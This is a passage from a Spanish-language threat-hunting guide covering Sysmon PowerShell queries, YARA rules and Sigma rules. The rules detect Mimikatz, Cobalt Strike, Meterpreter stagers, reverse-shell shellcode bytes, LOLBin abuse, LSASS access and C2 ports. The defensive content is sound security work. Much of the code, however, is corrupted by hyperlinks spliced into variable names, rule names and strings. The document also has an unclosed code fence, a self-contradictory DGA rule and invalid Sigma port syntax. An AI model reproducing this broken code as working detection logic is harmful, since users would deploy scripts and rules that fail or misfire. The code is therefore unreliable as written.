# DLL cargadas desde directorios de usuario
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=7} |
  Where-Object { $_.Properties[2].Value -match 'AppData|Temp|Downloads' } |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='DLL';e={$_.Properties[2].Value}}

# DLL no firmadas cargadas en procesos del sistema
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=7} |
  Where-Object {
    $_.Properties[1].Value -match 'svchost\.exe|lsass\.exe|services\.exe' -and
    $_.Properties[2].Value -notmatch '\\Windows\\System32\\'
  } |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='DLL';e={$_.Properties[2].Value}}
```

### 4.6 Sysmon Event 8 - CreateRemoteThread

```powershell
# Deteccion de inyeccion de procesos
# Un proceso legitimo no deberia crear hilos remotos en otros procesos

Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=8} |
  Select-Object TimeCreated,
    @{n='SourceProcess';e={$_.Properties[1].Value}},
    @{n='SourcePID';e={$_.Properties[2].Value}},
    @{n='TargetProcess';e={$_.Properties[5].Value}},
    @{n='TargetPID';e={$_.Properties[6].Value}}

# Buscar CreateRemoteThread hacia LSASS (dumping de credenciales)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=8} |
  Where-Object { $_.Properties[5].Value -match 'lsass\.exe' } |
  Select-Object TimeCreated,
    @{n='Source';e={$_.Properties[1].Value}},
    @{n='Target';e={$_.Properties[5].Value}}
```

### 4.7 Sysmon Event 9 - RawAccessRead

```powershell
# Deteccion de lectura directa de disco (Mimikatz)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=9} |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='Device';e={$_.Properties[2].Value}}

# Mimikatz accede a \Device\PhysicalMemory
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=9} |
  Where-Object { $_.Properties[2].Value -match 'PhysicalMemory' } |
  Format-Table TimeCreated, @{n='Process';e={$_.Properties[1].Value}},
    @{n='Device';e={$_.Properties[2].Value}}
```

### 4.8 Sysmon Event 10 - ProcessAccess

```powershell
# Acceso a procesos con derechos administrativos
# Especialmente LSASS

Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} |
  Where-Object { $_.Properties[5].Value -match 'lsass\.exe' } |
  Select-Object TimeCreated,
    @{n='Source';e={$_.Properties[1].Value}},
    @{n='Target';e={$_.Properties[5].Value}},
    @{n='Access';e={$_.Properties[7].Value}} |
  Format-Table -AutoSize
```

### 4.9 Sysmon Event 11-14 - Registry Events

```powershell
# Persistencia via Run/RunOnce
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=13} |
  Where-Object { $_.Properties[2].Value -match 'Run|RunOnce|Startup' } |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='Key';e={$_.Properties[2].Value}},
    @{n='Value';e={$_.Properties[3].Value}}

# Nuevos servicios
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=13} |
  Where-Object { $_.Properties[2].Value -match 'SYSTEM\\CurrentControlSet\\Services' } |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='Key';e={$_.Properties[2].Value}}

# Image File Execution Options (IFEO) - Debugger
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=13} |
  Where-Object { $_.Properties[2].Value -match 'Image File Execution Options' } |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='Key';e={$_.Properties[2].Value}}
```

### 4.10 Sysmon Event 15 - FileCreateStreamHash

```powershell
# Detectar NTFS Alternate Data Streams
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=15} |
  Where-Object { $_.Properties[2].Value -notmatch ':Zone\.Identifier\$DATA' } |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='File';e={$_.Properties[2].Value}},
    @{n='Image';e={$_.Properties[4].Value}}

# Buscar streams ejecutables escondidos
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=15} |
  Where-Object { $_.Properties[4].Value -match 'pe32|mz|exe' } |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='File';e={$_.Properties[2].Value}},
    @{n='Image';e={$_.Properties[4].Value}}
```

### 4.11 Sysmon Event 17-18 - Pipe Events

```powershell
# Named pipes (comunicacion inter-proceso)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=17} |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='PipeName';e={$_.Properties[2].Value}}

# Pipes sospechosas (nombres comunes de C2)
$suspicious_pipes = @('msagent', 'mypipe', 'svcctl', 'ntsvcs')
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=17} |
  Where-Object { $_.Properties[2].Value -match ($suspicious_pipes -join '|') } |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='PipeName';e={$_.Properties[2].Value}}
```

### 4.12 Sysmon Event 19-21 - [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Persistence

```powershell
# WMI Event Filter (Event 19)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=19} |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='Filter';e={$_.Properties[2].Value}}

# WMI Event Consumer (Event 20)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=20} |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='Consumer';e={$_.Properties[2].Value}}

# WMI Event Binding (Event 21)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=21} |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='Binding';e={$_.Properties[2].Value}}
```

### 4.13 Sysmon Event 22 - [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) Queries

```powershell
# Consultas DNS (potencial C2 beaconing)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=22} |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='Query';e={$_.Properties[4].Value}}

# Dominios con DGA (Domain Generation Algorithm)
# DGA patterns: muchas consultas a dominios con alta entropia
$queries = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=22}
$dga_candidates = $queries |
  Where-Object { $_.Properties[4].Value -match '^[a-z]{12,}\.(com|net|org|xyz)$' } |
  Group-Object { $_.Properties[4].Value } |
  Where-Object { $_.Count -gt 5 }

### 4.14 Sysmon Event 23 - File Delete

```powershell
# Deteccion de eliminacion de archivos (posible anti-forense)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=23} |
  Where-Object { $_.Properties[4].Value -notmatch '\\Windows\\Temp\\' } |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='File';e={$_.Properties[4].Value}},
    @{n='Hashes';e={$_.Properties[5].Value}}

# Eliminacion masiva de archivos
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=23} |
  Group-Object { $_.Properties[1].Value } |
  Where-Object { $_.Count -gt 10 } |
  Select-Object Count, Name
```

### 4.15 Sysmon Event 25 - Process Tampering

```powershell
# Manipulacion de procesos (posible EDR bypass)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=25} |
  Select-Object TimeCreated,
    @{n='Process';e={$_.Properties[1].Value}},
    @{n='Type';e={$_.Properties[4].Value}}
```

### 4.16 Sysmon Hunting Script Completo

```powershell
# sysmon_hunt.ps1 - Script de hunting con Sysmon

param(
    [int]$Hours = 24,
    [string]$LogName = "Microsoft-Windows-Sysmon/Operational"
)

$startTime = (Get-Date).AddHours(-$Hours)
$results = @()

# Event 1: Process Creation - detect LOLBins
$events1 = Get-WinEvent -FilterHashtable @{LogName=$LogName; ID=1; StartTime=$startTime}
$lolbins = @('rundll32.exe','regsvr32.exe','mshta.exe','certutil.exe','wmic.exe','cscript.exe','wscript.exe')
$suspicious = $events1 | Where-Object { $_.Properties[4].Value -match ($lolbins -join '|') }
foreach ($e in $suspicious) {
    $results += [PSCustomObject]@{
        Time = $e.TimeCreated
        EventID = 1
        Description = "LOLBin ejecutado"
        Process = $e.Properties[4].Value
        Parent = $e.Properties[11].Value
        Command = $e.Properties[9].Value
        User = $e.Properties[13].Value
    }
}

# Event 3: Network Connections a IPs externas
$events3 = Get-WinEvent -FilterHashtable @{LogName=$LogName; ID=3; StartTime=$startTime}
$external = $events3 | Where-Object {
    $[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) = $_.Properties[4].Value
    $ip -and $ip -ne '' -and $ip -notmatch '^192\.168\.|^10\.|^172\.(1[6-9]|2[0-9]|3[0-1])' -and $ip -ne '127.0.0.1'
}
foreach ($e in $external) {
    $results += [PSCustomObject]@{
        Time = $e.TimeCreated
        EventID = 3
        Description = "Conexion saliente externa"
        Process = $e.Properties[1].Value
        IP = $e.Properties[4].Value
        Port = $e.Properties[5].Value
        State = $e.Properties[7].Value
    }
}

# Event 8: CreateRemoteThread (inyeccion)
$events8 = Get-WinEvent -FilterHashtable @{LogName=$LogName; ID=8; StartTime=$startTime}
foreach ($e in $events8) {
    $results += [PSCustomObject]@{
        Time = $e.TimeCreated
        EventID = 8
        Description = "Creacion de [hilo](../raw/0s-f0nd4m3nt0s.md#hilos) remoto"
        Source = $e.Properties[1].Value
        Target = $e.Properties[5].Value
    }
}

# Event 9: RawAccessRead (Mimikatz)
$events9 = Get-WinEvent -FilterHashtable @{LogName=$LogName; ID=9; StartTime=$startTime}
foreach ($e in $events9) {
    $results += [PSCustomObject]@{
        Time = $e.TimeCreated
        EventID = 9
        Description = "Lectura de acceso raw"
        Process = $e.Properties[1].Value
        Device = $e.Properties[2].Value
    }
}

# Event 10: ProcessAccess a LSASS
$events10 = Get-WinEvent -FilterHashtable @{LogName=$LogName; ID=10; StartTime=$startTime}
$lsass_access = $events10 | Where-Object { $_.Properties[5].Value -match 'lsass' }
foreach ($e in $lsass_access) {
    $results += [PSCustomObject]@{
        Time = $e.TimeCreated
        EventID = 10
        Description = "Acceso a LSASS"
        Source = $e.Properties[1].Value
        Target = $e.Properties[5].Value
        Access = $e.Properties[7].Value
    }
}

# Event 11-14: Registry persistence
$events13 = Get-WinEvent -FilterHashtable @{LogName=$LogName; ID=13; StartTime=$startTime}
$persistence = $events13 | Where-Object {
    $_.Properties[2].Value -match 'Run\\|RunOnce\\|Startup\\|Image File Execution Options'
}
foreach ($e in $persistence) {
    $results += [PSCustomObject]@{
        Time = $e.TimeCreated
        EventID = 13
        Description = "[persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) en registro"
        Process = $e.Properties[1].Value
        Key = $e.Properties[2].Value
        Value = $e.Properties[3].Value
    }
}

# Event 22: DNS queries sospechosas
$events22 = Get-WinEvent -FilterHashtable @{LogName=$LogName; ID=22; StartTime=$startTime}
$dga = $events22 | Where-Object { $_.Properties[4].Value -match '^[a-z0-9]{15,}\.([com](../raw/w1n-s9bsyst3ms.md#com)|net|org|xyz|info|top)$' }
foreach ($e in $dga) {
    $results += [PSCustomObject]@{
        Time = $e.TimeCreated
        EventID = 22
        Description = "DGA DNS query"
        Process = $e.Properties[1].Value
        Query = $e.Properties[4].Value
    }
}

# Report
$results | Export-Csv "sysmon_hunt_report.csv" -NoTypeInformation
$results | Group-Object EventID | Select-Object Count, Name | Sort-Object Count -Descending
```

## 5. YARA Rules

### 5.1 Introduccion a YARA

YARA es una herramienta para identificar y clasificar muestras de malware basada en reglas textuales o binarias.

```bash
# Instalar YARA
pip install [yara](../raw/thr3t-hnt.md#yara)-[python](../raw/pyth0n-f0r-h4ck1ng.md)
# o
apt install yara

# Compilar reglas
yarac source.yara compiled.yarac

# Escanear archivos
yara rules.yara target.exe
yara -r rules.yara C:\\Windows\\System32\\

# Escanear proceso en memoria
yara -p 1234 rules.yara

# Escanear con reglas compiladas
yara -C compiled.yarac target.exe
```

### 5.2 Estructura de una Regla YARA

```yara
rule RuleName : Tag1 Tag2 {
    meta:
        description = "Descripcion de la regla"
        author = "Nombre del autor"
        date = "2024-05-24"
        reference = "[https](../raw/r3d3s-f0nd4m3nt0s.md#https)://example.com/ioc"
        [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) = "SHA256 [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions)"
        severity = "high"

    strings:
        $string1 = "malicious_string" nocase
        $string2 = { 4D 5A 90 00 }        // Hex MZ header
        $string3 = /reg[A-Za-z]{2,5}key/  // Regex
        $text1 = "texto ancho" wide
        $text2 = "texto" fullword

    condition:
        $string1 or $string2 or $string3
}
```

### 5.3 YARA Modules

```yara
import "[pe](../raw/w1n-1nt3rn4ls.md#pe)"
import "elf"
import "math"
import "hash"
import "dotnet"
import "cuckoo"
import "magic"

rule PE_Malicious_Section : Malware {
    meta:
        description = "Detecta secciones PE sospechosas"

    condition:
        pe.number_of_sections > 5 and
        for any section in pe.sections : (
            section.name == ".text" and
            section.entropy > 7.0
        )
}

rule ELF_Backdoor : Linux_Malware {
    meta:
        description = "Detecta backdoors ELF con strings sospechosos"

    strings:
        $shell = "/bin/sh"
        $reverse = "reverse" nocase
        $socket = "socket" nocase

    condition:
        elf.type == elf.ET_EXEC and
        elf.number_of_sections > 10 and
        all of ($shell*) and
        any of ($reverse, $socket)
}

rule High_Entropy : Suspicious {
    meta:
        description = "Detecta archivos con alta entropia (empaquetados/ofuscados)"

    condition:
        math.entropy(0, filesize) > 6.5 and
        filesize < 2MB
}

rule Hash_Based_IOC {
    meta:
        description = "Detecta por hash especifico"

    condition:
        hash.md5(0, filesize) == "d41d8cd98f00b204e9800998ecf8427e" or
        hash.sha1(0, filesize) == "da39a3ee5e6b4b0d3255bfef95601890afd80709" or
        hash.sha256(0, filesize) == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
}
```

### 5.4 Reglas YARA para Red Teams

```yara
// Reglas para detectar herramientas de [red team](../raw/r3d-t34m-1nfr4.md)
import "pe"

rule CobaltStrike_Beacon {
    meta:
        description = "Detecta [cobalt strike](../raw/r3d-t34m-1nfr4.md#cobalt-strike) Beacon"
        author = "[red team](../raw/r3d-t34m-1nfr4.md) Hunter"

    strings:
        $s1 = "MZ" ascii
        $s2 = "ReflectiveLoader" ascii
        $[s3](../raw/cl0ud-h4ck1ng.md#s3) = "beacon" ascii nocase
        $s4 = "ws2_32.dll" ascii
        $s5 = "wininet.dll" ascii

    condition:
        all of ($s1, $s2) or
        ($s1 and $s3 and ($s4 or $s5))
}

rule [mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz) {
    meta:
        description = "Detecta Mimikatz y variantes"
        author = "[red](../raw/r3d3s-f0nd4m3nt0s.md) Team Hunter"

    strings:
        $s1 = "mimikatz" ascii nocase
        $s2 = "sekurlsa" ascii nocase
        $s3 = "logonpasswords" ascii nocase
        $s4 = "wdigest" ascii nocase
        $s5 = "kerberos::" ascii nocase
        $s6 = { 48 65 79 20 6D 69 6D 69 }  // "Hey, mimi"
        $s7 = ":::" ascii

    condition:
        any of ($s1, $s2, $s3, $s4, $s5, $s6) or
        (#s7 > 10)
}

rule Metasploit_Meterpreter {
    meta:
        description = "Detecta payloads de [metasploit](../raw/m3t4spl01t.md)"
        author = "Red Team Hunter"

    strings:
        $metsrv = "metsrv" ascii nocase
        $meterp = "[meterpreter](../raw/m3t4spl01t.md#meterpreter)" ascii nocase
        $stager = { FC E8 82 00 00 00 60 89 E5 31 C0 64 8B 50 30 }
        $stage2 = { 8B 52 0C 8B 52 14 8B 72 28 0F B7 4A 26 }
        $revshell = { 31 C0 50 68 2F 2F 73 68 68 2F 62 69 6E }

    condition:
        any of them
}

rule Process_Injection : Malware_Technique {
    meta:
        description = "Detecta indicadores de inyeccion de procesos"
        author = "Red Team Hunter"

    strings:
        $vma = "VirtualAllocEx" ascii
        $wtpm = "WriteProcessMemory" ascii
        $crt = "CreateRemoteThread" ascii
        $rpm = "ReadProcessMemory" ascii
        $nqip = "NtQueueApcThread" ascii

    condition:
        2 of ($vma, $wtpm, $crt, $rpm, $nqip)
}

rule PowerShell_Obfuscated {
    meta:
        description = "Detecta [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) ofuscado"
        author = "Red Team Hunter"

    strings:
        $enc = "-enc" ascii nocase
        $bypass = "-ep bypass" ascii nocase
        $hidden = "-window hidden" ascii nocase
        $iex = "iex" ascii nocase
        $invoke = "invoke" ascii nocase
        $base64 = "frombase64string" ascii nocase
        $sploit = "sploit" ascii nocase

    condition:
        3 of ($enc, $bypass, $hidden, $iex, $invoke, $base64, $sploit)
}

rule Ransomware_Generic {
    meta:
        description = "Detecta ransomware generico"
        author = "Red Team Hunter"

    strings:
        $encrypt_ext = ".encrypted" ascii nocase
        $ransom_note = "ransom" ascii nocase
        $bitcoin = "bitcoin" ascii nocase
        $[tor](../raw/4n0n1m4t0.md#tor) = ".onion" ascii nocase
        $encrypt_func = "CryptEncrypt" ascii
        $delete = "VolumeShadowCopy" ascii
        $vss = "vssadmin" ascii nocase
        $bcdedit = "bcdedit" ascii nocase

    condition:
        3 of them
}
```

### 5.5 YARA Performance Optimization

```yara
// Regla optimizada con condiciones de rendimiento
rule Optimized_Rule {
    meta:
        description = "Regla optimizada para rendimiento"

    strings:
        $a = "string1" ascii
        $b = "string2" ascii
        $c = "string3" ascii
        $d = { 4D 5A }  // MZ header
        $e = { 50 45 }  // PE header

    condition:
        // Primero verificar archivos PE antes de buscar strings
        $d at 0 and
        $e at 0x3C and
        // Luego buscar strings solo en archivos PE
        any of ($a, $b, $c)
}

// Regla con limitacion de tamaño
rule Size_Limited {
    meta:
        description = "Solo escanea archivos < 10MB"

    strings:
        $s = "pattern"

    condition:
        filesize < 10MB and $s
}

// Usar math module para deteccion rapida de empaquetados
import "math"

rule Packed_DLL : Packed {
    condition:
        math.entropy(0, filesize) > 7.0 and
        filesize > 100KB and filesize < 5MB
}
```

### 5.6 Compilacion y Testing

```bash
# Compilar reglas
yarac rules.yara rules.compiled

# Usar reglas compiladas
yara -C rules.compiled target.exe

# Testing con datos conocidos
echo -n "mimikatz" > test.txt
yara mimikatz_rule.yara test.txt

# Test con directorio de muestras
yara -r -s rules.yara samples/  # -s muestra strings

# Performance test
time yara -r rules.yara windows/system32/

# Estadisticas de matching
yara -r -m rules.yara samples/  # -m muestra meta
```

### 5.7 YARA en Python

```python
import yara
import os, hashlib

class YARAScanner:
    def __init__(self, rule_path=None, rule_source=None):
        if rule_path:
            self.rules = yara.compile(filepath=rule_path)
        elif rule_source:
            self.rules = yara.compile(source=rule_source)
        else:
            self.rules = None

    def scan_file(self, filepath):
        """Escanear archivo individual"""
        try:
            matches = self.rules.match(filepath)
            if matches:
                for match in matches:
                    print(f"[!] {match.rule}: {filepath}")
                    for s in match.strings:
                        print(f"    String: {s.identifier} -> {s.instances[0].matched_data[:50]}")
            return matches
        except Exception as e:
            print(f"Error scanning {filepath}: {e}")
            return []

    def scan_directory(self, directory, recursive=True):
        """Escanear directorio completo"""
        results = {}
        for root, dirs, files in os.walk(directory):
            for fname in files:
                fpath = os.path.join(root, fname)
                matches = self.scan_file(fpath)
                if matches:
                    h = hashlib.sha256(open(fpath, 'rb').read()).hexdigest()
                    results[fpath] = {
                        'matches': [m.rule for m in matches],
                        'sha256': h
                    }
                if not recursive:
                    break
        return results

    def scan_memory(self, pid):
        """Escanear memoria de un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos)"""
        try:
            import psutil
            proc = psutil.Process(pid)
            memory = proc.memory_info()
            # Leer memoria del proceso
            with open(f"/proc/{pid}/mem", "rb") as f:
                data = f.read()
            matches = self.rules.match(data=data)
            return matches
        except:
            print("Memory scanning only supported on Linux")
            return []

## 6. [sigma](../raw/thr3t-hnt.md#sigma) Rules

### 6.1 Introduccion

Sigma es un formato generico para reglas de deteccion que pueden convertirse a multiples SIEMs (Splunk, ELK, QRadar, ArcSight, etc.).

```yaml
title: Sigma Rule Title
id: UUID
status: experimental/stable/deprecated
description: Descripcion de la regla
author: Autor
date: 2024-05-24
tags:
  - attack.execution
  - attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\cmd.exe'
    ParentImage|endswith: '\\winword.exe'
  condition: selection
falsepositives:
  - Administrators running cmd from Office
level: high
```

### 6.2 Log Sources

```yaml
logsource:
  # Categorias principales
  category: process_creation        # Sysmon EID 1 / Security 4688
  category: image_load              # Sysmon EID 7
  category: network_connection      # Sysmon EID 3
  category: file_event              # Sysmon EID 11
  category: registry_event          # Sysmon EID 12-14
  category: registry_set            # Sysmon EID 13
  category: dns_query               # Sysmon EID 22
  category: process_access          # Sysmon EID 10
  category: raw_access_read         # Sysmon EID 9
  category: create_remote_thread    # Sysmon EID 8
  category: pipe_event              # Sysmon EID 17-18
  
  # Productos
  product: windows
  product: linux
  product: macos

  # Servicios
  service: security                 # Security.evtx
  service: sysmon                   # Sysmon log
  service: powershell               # PowerShell.evtx
  service: dns                      # DNS server
  service: webserver                # IIS/Apache/Nginx
```

### 6.3 Reglas por Categoria

#### Process Creation

```yaml
title: Suspicious Process from Office
id: UUID-1
description: Detecta procesos lanzados desde Office
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\\WINWORD.EXE'
      - '\\EXCEL.EXE'
      - '\\OUTLOOK.EXE'
      - '\\POWERPNT.EXE'
    Image|endswith:
      - '\\cmd.exe'
      - '\\powershell.exe'
      - '\\cscript.exe'
      - '\\wscript.exe'
      - '\\mshta.exe'
      - '\\rundll32.exe'
  condition: selection
falsepositives:
  - Administrators running scripts from Office
level: high
tags:
  - attack.t1204
  - attack.t1566.001
```

```yaml
title: Powershell Encoded Command
id: UUID-2
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\powershell.exe'
    CommandLine|contains:
      - '-enc'
      - '-e '
      - 'encodedcommand'
  condition: selection
falsepositives:
  - Some administrative scripts
level: high
tags:
  - attack.t1059.001
  - attack.t1027
```

```yaml
title: Suspicious LOLBin Execution
id: UUID-3
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith:
      - '\\rundll32.exe'
      - '\\regsvr32.exe'
      - '\\mshta.exe'
      - '\\certutil.exe'
      - '\\wmic.exe'
      - '\\msiexec.exe'
      - '\\reg.exe'
      - '\\schtasks.exe'
      - '\\bcdedit.exe'
      - '\\vssadmin.exe'
    CommandLine|contains:
      - 'url'
      - 'http'
      - 'download'
      - 'cache'
      - 'delete'
      - '/delete'
  condition: selection
falsepositives:
  - Legitimate system administration
level: medium
tags:
  - attack.t1218
```

#### Network Connection

```yaml
title: Suspicious Outbound Network Connection
id: UUID-4
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    Initiated: 'true'
    DestinationIp|contains:
      - '185.'
      - '5.45.'
      - '91.121.'
      - '46.166.'
    DestinationPort:
      - 4444
      - 1337
      - 5555
      - 6666
      - 7777
      - 8888
      - 31337
  condition: selection
falsepositives:
  - Very rare
level: critical
tags:
  - attack.t1071
```

```yaml
title: Non-Browser Process Connecting to Internet
id: UUID-5
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    Initiated: 'true'
    Image|endswith:
      - '\\notepad.exe'
      - '\\calc.exe'
      - '\\mspaint.exe'
      - '\\winword.exe'
      - '\\excel.exe'
    DestinationPort: 80 or 443
  condition: selection
falsepositives:
  - Some applications use internet for updates
level: medium
```

#### Registry Event

```yaml
title: Registry Persistence via Run Key
id: UUID-6
logsource:
  category: registry_set
  product: windows
detection:
  selection:
    TargetObject|contains:
      - 'CurrentVersion\\Run\\'
      - 'CurrentVersion\\RunOnce\\'
      - 'CurrentVersion\\RunOnceEx\\'
      - 'CurrentVersion\\RunServices\\'
      - 'CurrentVersion\\Windows\\Run'
    Image|endswith:
      - '\\*.exe'
      - '\\*.dll'
  condition: selection
falsepositives:
  - Legitimate software installation
level: high
tags:
  - attack.t1547.001
```

#### [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) Query

```yaml
title: Suspicious DNS Query (DGA)
id: UUID-7
logsource:
  category: dns_query
  product: windows
detection:
  selection:
    QueryName|re: '^[a-z0-9]{15,}\.(com|net|org|xyz|info|top|club)$'
    QueryName|contains:
      - 'microsoft'
      - 'google'
      - 'windows'
  condition: selection and not filter
  filter:
    QueryName|contains:
      - 'microsoft.com'
      - 'windows.com'
falsepositives:
  - Some legitimate DGAs (browser)
level: medium
tags:
  - attack.t1568.002
```

#### File Event

```yaml
title: Suspicious File Creation in System32
id: UUID-8
logsource:
  category: file_event
  product: windows
detection:
  selection:
    TargetFilename|contains:
      - '\\System32\\'
      - '\\SysWOW64\\'
    TargetFilename|endswith:
      - '.exe'
      - '.dll'
      - '.sys'
      - '.com'
      - '.ps1'
  filter:
    TargetFilename|contains:
      - '\\catroot\\'
      - '\\DriverStore\\'
      - '\\MsDTC\\'
      - '\\Tasks\\'
  condition: selection and not filter
level: high
tags:
  - attack.t1070.004
```

### 6.4 Sigma Conversion

```bash
# Instalar sigma
pip install sigmatools

# Convertir regla Sigma a formato SIEM
sigma convert -t splunk -f rule.yml
sigma convert -t elk -f rule.yml
sigma convert -t qradar -f rule.yml
sigma convert -t arcsight -f rule.yml
sigma convert -t sentinel -f rule.yml
sigma convert -t kibana -f rule.yml

# Convertir directorio completo
sigma convert --target splunk -d rules/windows/process_creation/

# Convertir y validar
sigma validate rule.yml
sigma check rule.yml

# Listar backends disponibles
sigma list-backends

# Convertir con configuracion personalizada
sigma convert -t splunk -c config.yml rule.yml
```

### 6.5 Sigma Rules para [red](../raw/r3d3s-f0nd4m3nt0s.md) Teams

```yaml
title: Cobalt Strike Named Pipe
id: UUID-CS-1
logsource:
  category: pipe_event
  product: windows
detection:
  selection:
    PipeName|contains:
      - '\\msagent_'
      - '\\mypipe-f'
      - '\\status_'
      - '\\postex_'
      - '\\MSSE-'
  condition: selection
level: critical
tags:
  - attack.t1574.002
  - cobaltstrike
```

```yaml
title: Suspicious LSASS Process Access
id: UUID-MIMI-1
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\\lsass.exe'
    GrantedAccess|contains: '0x1FFFFF'  # PROCESS_ALL_ACCESS
    SourceImage|endswith:
      - '\\*.exe'
      - '\\*.dll'
  filter:
    SourceImage|endswith:
      - '\\svchost.exe'
      - '\\lsass.exe'
      - '\\winlogon.exe'
  condition: selection and not filter
level: critical
tags:
  - attack.t1003.001
  - credential_access
```

## 7. ATT&CK-based Hunting

### 7.1 Framework [mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck)

MITRE ATT&CK es una base de conocimiento de tacticas y tecnicas usadas por atacantes. Para hunting, mapeamos hipotesis a tecnicas especificas.

**Tacticas principales:**
- Reconnaissance (TA0043) - [reconocimiento](../raw/0s1nt.md#reconocimiento)
- Resource Development (TA0042) - Desarrollo de recursos
- Initial Access (TA0001) - Acceso inicial
- Execution (TA0002) - Ejecucion
- Persistence (TA0003) - [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)
- [privilege escalation](../raw/l1n9x-pr1v3sc.md) (TA0004) - [escalada de privilegios](../raw/l1n9x-pr1v3sc.md)
- Defense Evasion (TA0005) - Evasion de defensas
- Credential Access (TA0006) - Acceso a credenciales
- Discovery (TA0007) - Descubrimiento
- Lateral Movement (TA0008) - Movimiento lateral
- Collection (TA0009) - Recoleccion
- [command and control](../raw/r3v3rs3-sh3lls.md#command-and-control) (TA0011) - [c2](../raw/r3v3rs3-sh3lls.md#command-and-control)
- Exfiltration (TA0010) - Exfiltracion
- Impact (TA0040) - Impacto

### 7.2 Hipotesis de Hunting por Tecnica

```yaml
T1059.001 - PowerShell:
  hipotesis: "El atacante esta usando PowerShell ofuscado"
  fuentes:
    - Sysmon EID 1 (ProcessCreate)
    - Sysmon EID 3 (NetworkConnect)
    - PowerShell.evtx (ScriptBlockLogging)
  deteccion:
    - CommandLine contiene "-enc", "-e ", "bypass"
    - ScriptBlock contiene "FromBase64String"
    - Conexiones desde powershell.exe a IPs externas

T1003.001 - LSASS Memory:
  hipotesis: "El atacante esta dumpando credenciales de LSASS"
  fuentes:
    - Sysmon EID 10 (ProcessAccess)
    - Sysmon EID 8 (CreateRemoteThread)
    - Sysmon EID 9 (RawAccessRead)
  deteccion:
    - ProcessAccess a lsass.exe
    - OpenProcess con PROCESS_ALL_ACCESS
    - Lectura de \Device\PhysicalMemory

T1055 - Process Injection:
  hipotesis: "Hay procesos inyectados en procesos legitimos"
  fuentes:
    - Sysmon EID 8 (CreateRemoteThread)
    - Volatility malfind
  deteccion:
    - CreateRemoteThread entre diferentes procesos
    - Paginas RWX en procesos legitimos
    - DLLs inyectadas desde directorios temporales

T1547.001 - Registry Run Keys:
  hipotesis: "El atacante establecio persistencia via registro"
  fuentes:
    - Sysmon EID 13 (RegistryEvent)
    - Security 4657 (Registry modification)
  deteccion:
